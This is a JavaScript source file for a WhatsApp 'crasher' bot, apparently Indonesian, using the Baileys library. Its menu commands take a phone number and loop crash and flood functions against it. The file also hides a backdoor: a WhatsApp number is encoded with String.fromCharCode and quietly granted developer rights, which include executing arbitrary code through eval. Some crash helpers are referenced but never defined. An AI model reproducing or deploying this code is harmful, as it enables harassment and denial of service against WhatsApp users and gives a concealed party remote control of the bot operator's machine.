require('./settings');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const fetch = require('node-fetch');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? sock.user.id.split(":")[0] || sock.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
 var prefix = prefa ? 
   (body.match(/^[/]/gi)?.[0] || "")        
//   (body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)?.[0] || "") 
            : prefa ?? global.prefix;

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const args = body.trim().split(/ +/).slice(1);
// Database And Lain"
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const botNumber = await sock.decodeJid(sock.user.id);
const isDeveloper = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owner].includes(m.sender) ? true : m.isDeveloper ? true : false

const premium = JSON.parse(fs.readFileSync("./lib/data/premium.json"))

const isPremium = premium.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// function Group
const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isDeveloperGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isDeveloperAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('./lib/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
} 

// PASANG FUNCT DI SINI 👇

//==================================
//===========[ COMBO ]==============
//====≠=============================
async function DozerHub(target) {
    for (let i = 0; i <= 50; i++) {
    await bulldozerV2(target)
    await sleep(1500)
    await bulldozer1GB(sock, jid)
    await sleep(1500)
    await bulldozerV2(target)
    await bulldozer1GB(sock, jid)
    }
}
        // Random Emoji //
        
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Botz //
const example = async (teks) => {
const commander = `*乂 Contoh Penggunaan :* *${command}* ${teks}*`
return sock.sendMessage(m.chat, {text: commander }, {quoted: loli})
}
const thumb = fs.readFileSync('./lib/Image/thumb.jpg');

async function loading() {
        var loadd = [
           "▰▱▱▱▱▱▱▱▱▱ 10%",
           "▰▰▱▱▱▱▱▱▱▱ 20%",
           "▰▰▰▱▱▱▱▱▱▱ 30%",
           "▰▰▰▰▱▱▱▱▱▱ 40%",
           "▰▰▰▰▰▱▱▱▱▱ 50%",
           "▰▰▰▰▰▰▱▱▱▱ 60%",
           "▰▰▰▰▰▰▰▱▱▱ 70%",
           "▰▰▰▰▰▰▰▰▱▱ 80%",
           "▰▰▰▰▰▰▰▰▰▱ 90%",
           "▰▰▰▰▰▰▰▰▰▰ 100%",
           "SCRIPT SIAP BANG NGAT 🦠"  
         ];
    let { key } = await sock.sendMessage(m.chat, { text: 'ʟᴏᴀᴅɪɴɢ...' });
    for (let i = 0; i < loadd.length; i++) {
      await sleep(2000);
      await sock.sendMessage(m.chat, { text: loadd[i], edit: key });
  }
} 

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
sock.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `© NgatGanteng`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `*@${m.pushName} : ${prefix+command}*`}}}

const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: thumb,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const reply = (teks) => { 
sock.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `Script NgatCrasher 𝗕𝘆 NgatGanteng`,"body": `© DevilCrasher`, "previewType": "PHOTO","thumbnailUrl": `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${command}`}}}, { quoted: hw})} 

const reaction = async (jidss, emoji) => {
sock.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
switch (command) {
        
case 'start': {
   await loading()
    sock.sendMessage(m.chat, {audio: fs.readFileSync('./Zall.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: sound})
let menu = `┏━━━❲ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 ❳
┃ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : ${pushname}
┃ 𝙽𝙰𝙼𝙰 𝙳𝙴𝚅 : ${global.ownername}
┃ 𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : ${global.botname}
┃ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : ${global.version}
┗━━━━━━━━━`
let buttons = [
        { buttonid: "/tqto", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/faiw11.jpg` },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363333258337680@newsletter",
                newsletterName: "NGAT BOLD 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 𝕾𝖈𝖗𝖎𝖕𝖙"
            }
        },
        footer: "© 𝗘𝗻𝗷𝗼𝘆 𝗨𝘀𝗶𝗻𝗴 NGAT 𝗕𝗼𝘁𝘇!",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "©︎ Menu",
                    sections: [
                        {
                            title: "Please Chose One",
                            highlight_label: "",
                            rows: [
                                { title: "Owner Menu", description: "Menampilkan *( Owner Menu )*", id: "/ownermenu" },
                                { title: "Bug Menu", description: "Menampilkan *( Bug Menu )*", id: "/bugmenu" },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: loli });
}; break
        
case "bugmenu": {
sock.sendMessage(m.chat, {audio: fs.readFileSync('./Zall.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: sound})
let msgbug = `『 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 』
 私 xinvis < ɴᴜᴍʙᴇʀ >
 私 xblank < ɴᴜᴍʙᴇʀ >
 私 xcombo < ɴᴜᴍʙᴇʀ > 
 私 xbulldozer < ɴᴜᴍʙᴇʀ >  
 私  LuciferFC < ɴᴜᴍʙᴇʀ >  `
 
let buttons = [
        { buttonid: "/owner", buttonText: { displayText: "Owner" } }, 
        { buttonid: "/tqto", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/qmi5if.mp4` },
	    gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363333258337680@newsletter",
                newsletterName: "NGAT BOLD 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 𝕾𝖈𝖗𝖎𝖕𝖙"
            }
        },
        footer: "© 𝗘𝗻𝗷𝗼𝘆 𝗨𝘀𝗶𝗻𝗴 NGAT 𝗕𝗼𝘁𝘇!",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await sock.sendMessage(m.chat, buttonMessage, { quoted: loli });
} break

case 'xbulldozer': {
    if (!isPremium && !isDeveloper) return m.reply(mess.ownerprem);
    if (!q) return m.reply(`*Example:*\n${prefix + command} 62xx / @tag`);

    let pepec = q.replace(/[^0-9]/g, "");
    
    if (pepec.startsWith('0')) {
        return m.reply(`nomor harus dimulai dengan kode negara.`);
    }

    let target = `${pepec}@s.whatsapp.net`;

    m.reply(`berhasil mengirim pesan bug ke ${pepec}`); 
  
  // Parameters
  for (let r = 0; r < 50; r++) {
  await DozerHub(target);
  await DozerHub(target);
  await DozerHub(target);
}
} break

case 'xinvis': {
    if (!isPremium && !isDeveloper) return m.reply(mess.ownerprem);
    if (!q) return m.reply(`*Example:*\n${prefix + command} 62xx / @tag`);

    let pepec = q.replace(/[^0-9]/g, "");
    
    if (pepec.startsWith('0')) {
        return m.reply(`nomor harus dimulai dengan kode negara.`);
    }

    let target = `${pepec}@s.whatsapp.net`;

    m.reply(`berhasil mengirim pesan bug ke ${pepec}`); 
  
  // Parameters
  for (let r = 0; r < 50; r++) {
  await delayMakerInvisible(target);
  await delayMakerInvisible(target);
  await delayMakerInvisible(target);
}
} break

case 'xblank': {
    if (!isPremium && !isDeveloper) return m.reply(mess.ownerprem);
    if (!q) return m.reply(`*Example:*\n${prefix + command} 62xx / @tag`);

    let pepec = q.replace(/[^0-9]/g, "");
    
    if (pepec.startsWith('0')) {
        return m.reply(`nomor harus dimulai dengan kode negara.`);
    }

    let target = `${pepec}@s.whatsapp.net`;

    m.reply(`SUCCES SENDING BUG ${pepec}`); 
  
  // Parameters
  for (let r = 0; r < 50; r++) {
  await crashNewsletter(target);
  await pedoxjomokcrash(target);
  await pedoxjomokcrash(target);
}
} break

case 'xcombo': {
    if (!isPremium && !isDeveloper) return m.reply(mess.ownerprem);
    if (!q) return m.reply(`*Example:*\n${prefix + command} 62xx / @tag`);

    let pepec = q.replace(/[^0-9]/g, "");
    
    if (pepec.startsWith('0')) {
        return m.reply(`nomor harus dimulai dengan kode negara.`);
    }

    let target = `${pepec}@s.whatsapp.net`;

    m.reply(`berhasil mengirim pesan bug ke ${pepec}`); 
  
  // Parameters
  for (let r = 0; r < 50; r++) {
  await delayMakerInvisible(target);
  await pedoxjomokcrash(target);
  await crashNewsletter(target);
  await LuciferFC(sock, targetNumber);
}
} break

case "tqto": {
let tqtoo = `『 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 』
 ➩ NgatBold ｢ ᴅᴇᴠᴇʟᴏᴘᴇʀ ｣
 ➩ MANG IPALL  ｢ TANGAN KANAN NGAT ｣
 ➩ ᴏʀᴛᴜ ｢ ᴍʏ sᴜᴘᴘᴏʀᴛ ｣
 ➩ ᴀʟʟᴀʜ sᴡᴛ ｢ ᴍʏ ɢᴏᴅ ｣`
let buttons = [
        { buttonid: "/owner", buttonText: { displayText: "Owner Menu" } }, 
        { buttonid: "/start", buttonText: { displayText: "Back To Menu" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/faiw11.jpg` },
	    gifPlayback: true,
        caption: tqtoo,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363333258337680@newsletter",
                newsletterName: "THE DEVIL SPY"
            }
        },
        footer: "© 𝗘𝗻𝗷𝗼𝘆 𝗨𝘀𝗶𝗻𝗴 NGAT 𝗕𝗼𝘁𝘇!",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await sock.sendMessage(m.chat, buttonMessage, { quoted: loli });
} break

case "public": { 
if (!isDeveloper) return reply(`\`Fitur Ini Hanya Dapat Diakses Oleh Owner Bot\``)
sock.public = true
reply(`*\`Successfully Changed Bot Mode To Public\`*`)
} break

case "self":
case "private": { 
if (!isDeveloper) return reply(`\`Fitur Ini Hanya Dapat Diakses Oleh Owner Bot\``)
sock.public = false
reply(`*\`Successfully Changed Bot Mode To Self/Private\`*`)
} break

case "addprem":{
if (!isDeveloper) return reply("khusus owner bot!!")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await sock.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync("./lib/data/premium.json", JSON.stringify(premium))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
} break

case "delprem":{
if (!isDeveloper) return reply("soasik bego gunain fitur owner gua!!")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./lib/data/premium.json", JSON.stringify(premium))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
} break

case "ownermenu": {
sock.sendMessage(m.chat, {audio: fs.readFileSync('./Zall.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: sound})
let own = `『 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 』
私 ᴀᴅᴅᴘʀᴇᴍ < ɴᴜᴍʙᴇʀ >
私 ᴅᴇʟᴘʀᴇᴍ < ɴᴜᴍʙᴇʀ >
私 sᴇʟғ ｢ 𝙾𝙽 / 𝙾𝙵  ｣
私 ᴘᴜʙʟɪᴄ  ｢ 𝙾𝙽 / 𝙾𝙵 ｣`
let buttons = [
        { buttonid: "/bugmenu", buttonText: { displayText: "Bug Menu" } }, 
        { buttonid: "/start", buttonText: { displayText: "Back To Menu" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/faiw11.jpg` },
	    gifPlayback: true,
        caption: own,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363333258337680@newsletter",
                newsletterName: "NGAT BOLD 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 𝕾𝖈𝖗𝖎𝖕𝖙"
            }
        },
        footer: "© 𝗘𝗻𝗷𝗼𝘆 𝗨𝘀𝗶𝗻𝗴 NGAT 𝗕𝗼𝘁𝘇!",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await sock.sendMessage(m.chat, buttonMessage, { quoted: loli });
} break

case "rvo": case "readviewonce": case "•": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return sock.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
default:
if (budy.startsWith('>')) {
if (!isDeveloper) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isDeveloper) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});